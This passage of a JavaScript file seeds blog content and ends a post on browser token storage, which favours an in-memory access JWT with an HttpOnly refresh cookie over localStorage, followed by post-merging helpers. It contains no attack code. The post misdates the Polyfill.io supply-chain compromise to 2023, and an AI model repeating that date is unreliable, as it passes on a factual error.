      → Set-Cookie: refresh=<token>; HttpOnly; Secure; SameSite=Lax

[API call]
  → Authorization: Bearer <access JWT from memory>

[Access JWT expires]
  → POST /auth/refresh
  → Refresh cookie sent automatically by browser
  → Server validates, issues new access JWT in response body
  → New JWT stored in memory
~~~

This pattern gives you:

- **No XSS-readable persistent token** — access JWT in JS memory is gone on tab close / page refresh
- **HttpOnly refresh cookie** — XSS cannot read or steal it
- **SameSite=Lax** — CSRF protection without custom token infrastructure
- **Short-lived access JWT** — compromise window limited to the token TTL

> [!TIP]
> For server-side rendered applications (Next.js App Router, for example), consider the BFF (Backend for Frontend) pattern: the access JWT never touches the browser at all. It lives exclusively in server-side state, and the browser only ever has an HttpOnly session cookie that the BFF exchanges for the token internally.

## What's Actually at Risk

The risks aren't theoretical. Real supply chain attacks on npm packages have exfiltrated tokens from \`localStorage\`. The 2023 Polyfill.io compromise injected malicious scripts into millions of sites without the affected teams knowing.

With \`localStorage\`, that injected script reads the token and sends it to an attacker's server. With an \`HttpOnly\` cookie, the same injected script cannot read the token. It can still make authenticated requests in the user's current session, but it cannot exfiltrate a credential that works after the session ends or from a different browser.

The distinction matters: \`HttpOnly\` cookies eliminate *credential theft* (the attacker taking the token elsewhere), not *session abuse* (the attacker acting within the current session). For most threat models — especially protecting API tokens valid beyond the current page load — eliminating credential theft is the higher-value protection.

## Key Takeaways

- \`localStorage\` is readable by any JS on your origin — XSS turns it into a credential theft vector
- \`HttpOnly\` cookies prevent JS from reading the token at all, eliminating the most common exfiltration pattern
- \`SameSite=Lax\` handles the majority of CSRF scenarios without additional token infrastructure
- The modern pattern: short-lived access JWT in memory + long-lived \`HttpOnly\` refresh cookie
- For SSR apps, consider keeping the access token server-side entirely and never exposing it to browser JS
`,
  },
].sort(sortNewestFirst);

export const getSeededBlogPostBySlug = (slug) =>
  seededBlogPosts.find((post) => post.slug === slug) ?? null;

export const normalizeStoredPost = (post) => ({
  ...post,
  sourceType: "database",
  createdAt: normalizeCreatedAt(post.createdAt),
});

export const mergeBlogPosts = (storedPosts = []) => {
  const mergedPosts = new Map(seededBlogPosts.map((post) => [post.slug, post]));

  storedPosts
    .filter(Boolean)
    .map(normalizeStoredPost)
    .forEach((post) => {
      mergedPosts.set(post.slug, post);
    });

  return Array.from(mergedPosts.values()).sort(sortNewestFirst);
};